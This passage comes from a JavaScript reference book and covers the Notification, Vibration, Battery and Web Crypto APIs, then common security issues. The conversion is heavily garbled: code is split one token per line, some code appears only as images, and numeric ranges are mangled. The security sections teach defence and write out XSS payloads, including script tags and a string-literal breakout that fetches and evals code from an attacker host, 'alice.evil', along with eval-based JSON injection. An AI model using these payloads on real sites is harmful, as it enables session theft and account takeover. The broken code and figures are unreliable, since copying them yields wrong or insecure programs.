<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 90.1: Requesting Permission to send notifications
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
  
  Notification.requestPermission
 
We use to ask the user if he/she wants to receive notifications from
our website.

Notification.

requestPermission

(

**function**

(

)

{

**if**

(

Notification.

permission

===

&apos;granted&apos;

)

{

*// user approved.*

*// use of new Notification(&hellip;) syntax will now be successful*

}

**else**

**if**

(

Notification.

permission

===

&apos;denied&apos;

)

{

*// user denied.*

}

**else**

{

*// Notification.permission === &apos;default&apos;*

*// user didn*

'

*t make a decision.*

*// You can*

'

*t send notifications until they grant permission.*

}

}

)

;

  
  .requestPermission
  

  

Since Firefox 47 The method can also return a promise when handling
the user&apos;s decision for granting permission

Notification.

requestPermission

(

)

.

then

(

**function**

(

permission

)

{

**if**

(

!

(

&apos;permission&apos;

**in**

Notification

)

)

{

Notification.

permission

=

permission

;

}

*// you got permission !*

}

,

**function**

(

rejection

)

{

*// handle rejection here.*

}

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 90.2: Sending Notifications
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

After the user has approved a request for permission to send
notifications, we can send a simple notification that says Hello to
the user: **new** Notification(&apos;Hello&apos;, { body: &apos;Hello, world!&apos;,
icon: &apos;url to an .ico image&apos; });
>
This will send a notification like this:
>
**Hello**
>
Hello, world!

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 90.3: Closing a notification
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  .close()
  

  

You can close a notification by using the method.

**let**

notification

=

**new**

Notification

(

title

,

options

)

;

*// do some work, then close the notification*

notification.

close

(

)

You can utilize the setTimeout function to auto-close the notification
sometime in the future.

**let**

notification

=

**new**

Notification

(

title

,

options

)

;

setTimeout

(

(

)

=&gt;

{

notification.

close

(

)

}

,

4000

)

;

The above code will spawn a notification and close it after 4 seconds.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 90.4: Notification events
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The Notification API specifications support 2 events that can be fired
by a Notification.

1.  The click event.

This event will run when you click on the notification body (excluding
the closing X and the Notifications configuration button).
>
Example:

notification.

onclick

=

**function**

(

event

)

{

console.

debug

(

&quot;you click me and this is my event object: &quot;

,

event

)

;

}

2.  The error event

The notification will fire this event whenever something wrong will
happen, like being unable to display

notification.

onerror

=

**function**

(

event

)

{

console.

debug

(

&quot;There was an error: &quot;

,

event

)

;

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 91: Vibration API
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Modern mobile devices include hardware for vibrations. The Vibration
API offers Web apps the ability to access this hardware, if it exists,
and does nothing if the device doesn&apos;t support it.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 91.1: Single vibration
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Vibrate the device for 100ms:

window.

navigator

.

vibrate

(

100

)

;

or

window.

navigator

.

vibrate

(

&lbrack;

100

&rbrack;

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 91.2: Check for support
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Check if browser supports vibrations

**if**

(

&apos;vibrate&apos;

**in**

window.

navigator

)

*// browser has support for vibrations*

**else**

*// no support*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 91.3: Vibration patterns
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

An array of values describes periods of time in which the device is
vibrating and not vibrating.

window.

navigator

.

vibrate

(

&lbrack;

200

,

100

,

200

&rbrack;

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 92: Battery Status API
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 92.1: Battery Events
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

*// Get the battery API*

navigator.

getBattery

(

)

.

then

(

**function**

(

battery

)

{

battery.

addEventListener

(

&apos;chargingchange&apos;

,

**function**

(

)

{

console.

log

(

&apos;New charging state: &apos;

,

battery.

charging

)

;

}

)

;

battery.

addEventListener

(

&apos;levelchange&apos;

,

**function**

(

)

{

console.

log

(

&apos;New battery level: &apos;

,

battery.

level

&ast;

100

&plus;

&quot;%&quot;

)

;

}

)

;

battery.

addEventListener

(

&apos;chargingtimechange&apos;

,

**function**

(

)

{

console.

log

(

&apos;New time left until full: &apos;

,

battery.

chargingTime

,

&quot; seconds&quot;

)

;

}

)

;

battery.

addEventListener

(

&apos;dischargingtimechange&apos;

,

**function**

(

)

{

console.

log

(

&apos;New time left until empty: &apos;

,

battery.

dischargingTime

,

&quot; seconds&quot;

)

;

}

)

;

}

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 92.2: Getting current battery level
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

*// Get the battery API*

navigator.

getBattery

(

)

.

then

(

**function**

(

battery

)

{

*// Battery level is between 0 and 1, so we multiply it by 100 to get in
percents*

console.

log

(

&quot;Battery level: &quot;

&plus;

battery.

level

&ast;

100

&plus;

&quot;%&quot;

)

;

}

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 92.3: Is battery charging?
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

*// Get the battery API*

navigator.

getBattery

(

)

.

then

(

**function**

(

battery

)

{

**if**

(

battery.

charging

)

{

console.

log

(

&quot;Battery is charging&quot;

)

;

}

**else**

{

console.

log

(

&quot;Battery is discharging&quot;

)

;

}

}

)

;

## Section 92.4: Get time left until battery is empty

*// Get the battery API*

navigator.

getBattery

(

)

.

then

(

**function**

(

battery

)

{

console.

log

(

&quot;Battery will drain in &quot;

,

battery.

dischargingTime

,

&quot; seconds&quot;

)

;

}

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 92.5: Get time left until battery is fully charged
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

*// Get the battery API*

navigator.

getBattery

(

)

.

then

(

**function**

(

battery

)

{

console.

log

(

&quot;Battery will get fully charged in &quot;

,

battery.

chargingTime

,

&quot; seconds&quot;

)

;

}

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 93: Fluent API
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

JavaScript is great for designing fluent API - a consumer-oriented API
with focus on developer experience. Combine with language dynamic
features for optimal results.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch93-1">Section 93.1: Fluent API capturing construction of HTML articles with JS</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
![](./images/image042.png){width="7.486805555555556in"
height="8.873611111111112in"}
![](./images/image043.png){width="7.486805555555556in"
height="5.711805555555555in"}
This allows the consumer of the API to have a nice-looking article
construction, almost a DSL for this purpose, using plain JS:
<h5>Version ≥ 6</h5>
**const** articles = &lbrack;
Article.withTopic(&apos;Artificial Intelligence - Overview&apos;)

.section(&apos;What is Artificial Intelligence?&apos;)

.addParagraph(&apos;Something something&apos;)

.addParagraph(&apos;Lorem ipsum&apos;)

.withEmphasis()

.section(&apos;Philosophy of AI&apos;)

.addParagraph(&apos;Something about AI philosophy&apos;)

.addParagraph(&apos;Conclusion&apos;),

Article.withTopic(&apos;JavaScript&apos;)

.list(&apos;JavaScript is one of the 3 languages all web developers must
learn:&apos;)

.addListItem(&apos;HTML to define the content of web pages&apos;)

.addListItem(&apos;CSS to specify the layout of web pages&apos;)

.addListItem(&apos; JavaScript to program the behavior of web pages&apos;)

&rbrack;; document.getElementById(&apos;content&apos;).innerHTML = articles.map(a
=&bsol;a.toHtml()).join(&apos;**&bsol;&bsol;n**&apos;);

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch94">Chapter 94: Web Cryptography API</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch94-1">Section 94.1: Creating digests (e.g. SHA-256)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
*// Convert string to ArrayBuffer. This step is only necessary if you
wish to hash a string, not if*
*you already got an ArrayBuffer such as an Uint8Array.*
**var**
input
=
**new**
TextEncoder
(
&apos;utf-8&apos;
)
.
encode
(
&apos;Hello world!&apos;
)
;
*// Calculate the SHA-256 digest*
crypto.
subtle
.
digest
(
&apos;SHA-256&apos;
,
input
)
*// Wait for completion*
.
then
(
**function**
(
digest
)
{
*// digest is an ArrayBuffer. There are multiple ways to proceed.*
*// If you want to display the digest as a hexadecimal string, this will
work:*
**var**
view
=
**new**
DataView
(
digest
)
;
**var**
hexstr
=
&apos;&apos;
;
**for**
(
**var**
i
=
0
;
i
&lt;
view.
byteLength
;
i
++
)
{
**var**
b
=
view.
getUint8
(
i
)
;
hexstr
+=

&apos;0123456789abcdef&apos;

&lbrack;

(

b

&

0xf0

)

&gt;&gt;

4

&rbrack;

;

hexstr

+=

&apos;0123456789abcdef&apos;

&lbrack;

(

b

&

0x0f

)

&rbrack;

;

}

console.

log

(

hexstr

)

;

*// Otherwise, you can simply create an Uint8Array from the buffer:*

**var**

digestAsArray

=

**new**

Uint8Array

(

digest

)

;

console.

log

(

digestAsArray

)

;

}

)

*// Catch errors*

.

**catch**

(

**function**

(

err

)

{

console.

error

(

err

)

;

}

)

;

  
  SHA-1       ,   SHA-256         ,   SHA-384         and       SHA-512
        

  

The current draft suggests to provide at least , but this is no strict
requirement and subject to change. However, the SHA family can still
be considered a good choice as it will likely be supported in all
major browsers.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 94.2: Cryptographically random data
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

*// Create an array with a fixed size and type.*

**var**

array

=

**new**

Uint8Array

(

5

)

;

*// Generate cryptographically random values*

crypto.

getRandomValues

(

array

)

;

*// Print the array to the console*

console.

log

(

array

)

;

  
  [crypto.getRandomValues(array)](https://developer.mozilla.org/en-US/docs/Web/API/RandomSource/getRandomValues)
  

  

can be used with instances of the following classes (described further
in Binary Data) and will generate values from the given ranges (both
ends inclusive):

Int8Array: -27 to 27-1

Uint8Array: 0 to 28-1

Int16Array: -215 to 215-1 Uint16Array: 0 to 216-1

Int32Array: -231 to 231-1

Uint32Array: 0 to 231-1

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 94.3: Generating RSA key pair and converting to PEM format
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

In this example you will learn how to generate RSA-OAEP key pair and
how to convert private key from this key pair to base64 so you can use
it with OpenSSL etc. Please note that this process can also be used
for public key you just have to use prefix and suffix below:

&minus;&minus;&minus;&bsol;

BEGIN PUBLIC KEY

&minus;&minus;&minus;&bsol;

&minus;&minus;&minus;&bsol;

END PUBLIC KEY

&minus;&minus;&minus;&bsol;

NOTE: This example is fully tested in these browsers: Chrome, Firefox,
Opera, Vivaldi

![](./images/image044.png){width="7.486805555555556in"
height="8.324305555555556in"}

console.

log

(

pem

)

;

}

)

.

**catch**

(

**function**

(

err

)

{

console.

log

(

err

)

;

}

)

;

}

)

;

That&apos;s it! Now you have a fully working and compatible RSA-OAEP
Private Key in PEM format which you can use wherever you want. Enjoy!

## Section 94.4: Converting PEM key pair to CryptoKey

So, have you ever wondered how to use your PEM RSA key pair that was
generated by OpenSSL in Web Cryptography API? If the answers is yes.
Great! You are going to find out.
>
NOTE: This process can also be used for public key, you only need to
change prefix and suffix to:

&minus;&minus;&minus;&bsol;

BEGIN PUBLIC KEY

&minus;&minus;&minus;&bsol;

&minus;&minus;&minus;&bsol;

END PUBLIC KEY

&minus;&minus;&minus;&bsol;

This example assumes that you have your RSA key pair generated in PEM.

![](./images/image045.png){width="7.486805555555556in"
height="6.270138888888889in"}

And now you&apos;re done! You can use your imported key in WebCrypto API.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 95: Security issues
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

This is a collection of common JavaScript security issues, like XSS
and eval injection. This collection also contains how to mitigate
these security issues.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 95.1: Reflected Cross-site scripting (XSS)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Let&apos;s say Joe owns a website that allows you to log on, view puppy
videos, and save them to your account.

  
  https    :   *//example.com/search?q=brown+puppies*
    

  

Whenever a user searches on that website, they are redirected to .
>
If a user&apos;s search doesn&apos;t match anything, than they see a message
along the lines of:

Your search (**brown puppies**), didn&apos;t match anything. Try again.

On the backend, that message is displayed like this:

**if**

(

!

searchResults

)

{

webPage

+=

&quot;&lt;div&gt;Your search (&lt;b&gt;&quot;

&plus;

searchQuery

&plus;

&quot;&lt;/b&gt;), didn&apos;t match anything. Try again.&quot;

;

}

  -
  **&lt;h1**      **&gt;**   headings**&lt;/h1**
  -  -

  -

However, when Alice searches for **&gt;**, she gets this back:
>
Your search (**headings**
>
) didn&apos;t match anything. Try again.
>
Raw HTML:
>
Your search (&lt;b&gt;&lt;h1&gt;headings&lt;/h1&gt;&lt;/b&gt;) didn&apos;t match anything.
Try again.

  
  **&lt;script**         **&gt;**   alert(1)**&lt;/script**
    

  

Than Alice searches for **&gt;**, she sees:

Your search (), didn&apos;t match anything. Try again.

And:

![](./images/image046.png){width="4.585416666666666in"
height="1.4868055555555555in"}

  
  **&lt;script** src = &quot;https://alice.evil/puppy_xss.js&gt;&lt;/script&gt;really
  cute puppies
  

  

Than Alice searches for , and copies the link in her address bar, and
then emails Bob:

Bob,

When I search for [cute
puppies](https://example.com/search?q=%3Cscript+src+=+%22https://alice.evil/puppy_xss.js%3E%3C/script%3Ereally+cute+puppies),
nothing happens!

Than Alice successfully gets Bob to run her script while Bob is logged
on to his account.
>
**Mitigation:**

1.  Escape all angle brackets in searches before returning the search
    term when no results are found.

2.  Don&apos;t return the search term when no results are found.

3.  **Add a [Content Security
    Policy](https://stackoverflow.com/q/30280370/6560716) that refuses
    to load active content from other domains**

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 95.2: Persistent Cross-site scripting (XSS)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Let&apos;s say that Bob owns a social website that allows users to
personalize their profiles.
>
Alice goes to Bob&apos;s website, creates an account, and goes to her
profile settings. She sets her profile description to I&apos;m actually
too lazy to write something here.
>
When her friends view her profile, this code gets run on the server:

**if**

(

viewedPerson.

profile

.

description

)

{

page

+=

&quot;&lt;div&gt;&quot;

&plus;

viewedPerson.

profile

.

description

&plus;

&quot;&lt;/div&gt;&quot;

;

}

**else**

{

page

+=

&quot;&lt;div&gt;This person doesn&apos;t have a profile description.&lt;/div&gt;&quot;

;

}

Resulting in this HTML:

**&lt;**

**div**

**&gt;**

I&apos;m actually too lazy to write something here.

**&lt;**

**/div**

**&gt;**

  
  **&lt;b**   **&gt;**   I like HTML**&lt;/b>**
    

  

Than Alice sets her profile description to **&gt;**. When she visits her
profile, instead of seeing

&lt;b&gt;I like HTML&lt;/b&gt;

she sees

**I like HTML**

Then Alice sets her profile to

**&lt;**

**script**

src =

&quot;https://alice.evil/profile_xss.js&quot;

**&gt;**

**&lt;**

**/script**

**&gt;**

I

&apos;m actually too lazy to write something

here.

Whenever someone visits her profile, they get Alice&apos;s script run on
Bob&apos;s website while logged on as their account.
>
**Mitigation**

1.  Escape angle brackets in profile descriptions, etc.

2.  Store profile descriptions in a plain text file that is then fetched
    with a script that adds the description via

.innerText

3.  **Add a [Content Security
    Policy](https://stackoverflow.com/q/30280370/6560716) that refuses
    to load active content from other domains**

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 95.3: Persistent Cross-site scripting from JavaScript string literals
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Let&apos;s say that Bob owns a site that lets you post public messages.
>
The messages are loaded by a script that looks like this:

addMessage

(

&quot;Message 1&quot;

)

;

addMessage

(

&quot;Message 2&quot;

)

;

addMessage

(

&quot;Message 3&quot;

)

;

addMessage

(

&quot;Message 4&quot;

)

;

addMessage

(

&quot;Message 5&quot;

)

;

addMessage

(

&quot;Message 6&quot;

)

;

The addMessage function adds a posted message to the DOM. However, in
an effort to avoid XSS, **any HTML in messages posted is escaped.**
>
The script is generated **on the server** like this:

**for**

(

**var**

i

=

0

;

i

&lt;

messages.

length

;

i

++

)

{

script

+=

&quot;addMessage(

**&bsol;&amp;quot;**

&quot;

&plus;

messages

&lbrack;

i

&rbrack;

&plus;

&quot;

**&bsol;&amp;quot;**

)

;&quot;

;

}

  
  My mom said     :   &quot;Life is good. Pie makes it better. &quot;
    -

  

So alice posts a message that says: . Than when she previews the
message, instead of seeing her message she sees an error in the
console:

Uncaught SyntaxError

:

missing

)

after argument list

Why? Because the generated script looks like this:

addMessage

(

&quot;My mom said: &quot;

Life is good.

Pie

makes it better.

&quot;&quot;

)

;

That&apos;s a syntax error. Than Alice posts:

I like pie
&quot;);fetch(&quot;https:*//alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);//*
Then the generated script looks like: addMessage(&quot;I like pie
&quot;);fetch(&quot;https://alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);*//&quot;);*

  -
  **https**    **:**   ***//alice.evil/js_xss.js***
   - 

  -

That adds the message I like pie, but it also **downloads and runs
whenever someone visits Bob&apos;s site.**
>
**Mitigation:**

1.  Pass the message posted into JSON.stringify()

2.  Instead of dynamically building a script, build a plain text file
    containing all the messages that is later fetched by the script

3.  **Add a [Content Security
    Policy](https://stackoverflow.com/q/30280370/6560716) that refuses
    to load active content from other domains**

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 95.4: Why scripts from other people can harm your website and its visitors
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

If you don&apos;t think that malicious scripts can harm your site, **you
are wrong**. Here is a list of what a malicious script could do:

1.  Remove itself from the DOM so that **it can&apos;t be traced**

2.  Steal users&apos; session cookies and **enable the script author to log
    in as and impersonate them**

3.  Show a fake &quot;Your session has expired. Please log in again.&quot;
    message that **sends the user&apos;s password to the script author**.

4.  Register a malicious service worker that runs a malicious script
    **on every page visit** to that website.

5.  Put up a fake paywall demanding that users **pay money** to access
    the site **that actually goes to the script author**.

Please, **don&apos;t think that XSS won&apos;t harm your website and its
visitors.**

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 95.5: Evaled JSON injection
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Let&apos;s say that whenever someone visits a profile page in Bob&apos;s
website, the following URL is fetched:

https

:

*//example.com/api/users/1234/profiledata.json*

With a response like this:

{

&quot;name&quot;

:

&quot;Bob&quot;

,

&quot;description&quot;

:

&quot;Likes pie & security holes.&quot;

}

Than that data is parsed & inserted:
>
**var** data = eval(&quot;(&quot; + resp + &quot;)&quot;);
document.getElementById(&quot;#name&quot;).innerText = data.name;
>
document.getElementById(&quot;#description&quot;).innerText =
data.description;
>
Seems good, right? **Wrong.**

  
  Likes XSS.&quot;});alert(1);({&quot;name&quot;:&quot;Alice&quot;,&quot;description&quot;:&quot;Likes
  XSS.
  

  

What if someone&apos;s description is ?
>
Seems weird, but if poorly done, the response will be:

{

&quot;name&quot;

:

&quot;Alice&quot;

,

&quot;description&quot;

:

&quot;Likes pie & security holes.&quot;

}

)

;

alert

(

1

)

;

(

{

&quot;name&quot;

:

&quot;Alice&quot;

,

&quot;description&quot;

:

&quot;Likes

XSS.&quot;

}

And this will be

eval

ed:

(

{

&quot;name&quot;

:

&quot;Alice&quot;

,

&quot;description&quot;

:

&quot;Likes pie & security holes.&quot;

}

)

;

alert

(

1

)

;

(

{

&quot;name&quot;

:

&quot;Alice&quot;

,

&quot;description&quot;

:

&quot;Likes

XSS.&quot;

}

)

If you don&apos;t think that&apos;s a problem, paste that in your console and
see what happens.
>
**Mitigation**
>
**Use JSON.parse instead of eval to get JSON.** In general, don&apos;t use
eval, and definitely don&apos;t use eval with something a user could
control. Eval [creates a new execution
context](http://dmitrysoshnikov.com/ecmascript/chapter-1-execution-contexts/),
creating a **performance hit**.

Properly escape

&quot;

and

&bsol;&bsol;

in user data before putting it in JSON. If you just escape the

&quot;

, than this will happen:

Hello

!

&bsol;&bsol;

&quot;});alert(1);({

Will be converted to:

&quot;Hello!

**&bsol;&bsol;&amp;ast;*

&quot;

}

)

;

alert

(

1

)

;

(

{

&quot;

Oops. Remember to escape both the &bsol;&bsol; and &quot;, or just use JSON.parse.

# Chapter 96: Same Origin Policy & CrossOrigin Communication

Same-Origin policy is used by web browsers to prevent scripts to be
able to access remote content if the remote address has not the same
**origin** of the script. This prevents malicious scripts from
performing requests to other websites to obtain sensitive data.
>
The **origin** of two addresses is considered the same if both URLs
have the same *protocol*, *hostname* and *port*.

## Section 96.1: Safe cross-origin communication with messages

  
  window.postMessage()   method together with its relative      window.onmessage
                         event handler                          
  -  -

  

The can be safely used to enable cross-origin communication.

  
  postMessage()
  

  

  
  postMessage()
  

  

The method of the target window can be called to send a message to
another window, which will be able to intercept it with its onmessage
event handler, elaborate it, and, if necessary, send a response back
to the sender window using again.
>
**Example of Window communicating with a children frame**

Content of

http

:

*//main-site.com/index.html*

:

*&lt;!&bsol; &hellip; &amp;gt;*

**&lt;**

**iframe**

id

=

&quot;frame-id&quot;

src

=

&quot;http://other-site.com/index.html&quot;

**&gt;**

**&lt;**

**/iframe**

**&gt;**

**&lt;**

**script**

src

=

&quot;main_site_script.js&quot;

**&gt;**

**/script**

**&lt;**

**&gt;**

*&lt;!&bsol; &hellip; &amp;gt;*

Content of

http

:

*//other-site.com/index.html*

:

*&lt;!&bsol; &hellip; &amp;gt;*

**&lt;**

**script**

src

=

&quot;other_site_script.js&quot;

**&gt;**

**&lt;**

**/src**

**&gt;**

*&lt;!&bsol; &hellip; &amp;gt;*

Content of

main_site_script.

js

:

*// Get the &lt;iframe&gt;&apos;s window*

**var**

frameWindow

=

document.

getElementById

(

&apos;frame-id&apos;

)

.

contentWindow

;

*// Add a listener for a response*

window.

addEventListener

(

&apos;message&apos;

,

**function**

(

evt

)

{

*// IMPORTANT: Check the origin of the data!*

**if**

(

event.

origin

.

indexOf

(

&apos;http://other-site.com&apos;

)

==

0

)

{

*// Check the response*

console.

log

(

evt.

data

)

;

*/&ast; &hellip; &ast;/*

}

}

)

;

*// Send a message to the frame&apos;s window*

frameWindow.

postMessage

(

*/&ast; any obj or var &ast;/*

,

&apos;&ast;&apos;

)

;

Content of

other_site_script.

js

:

window.

addEventListener

(

&apos;message&apos;

,

**function**

(

evt

)

{

*// IMPORTANT: Check the origin of the data!*

**if**

(

event.

origin

.

indexOf

(

&apos;http://main-site.com&apos;

)

==

0

)

{

*// Read and elaborate the received data*

console.

log

(

evt.

data

)

;

*/&ast; &hellip; &ast;/*

*// Send a response back to the main window*

window.

parent

.

postMessage

(

*/&ast; any obj or var &ast;/*

,

&apos;&ast;&apos;

)

;

}

}

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 96.2: Ways to circumvent Same-Origin Policy
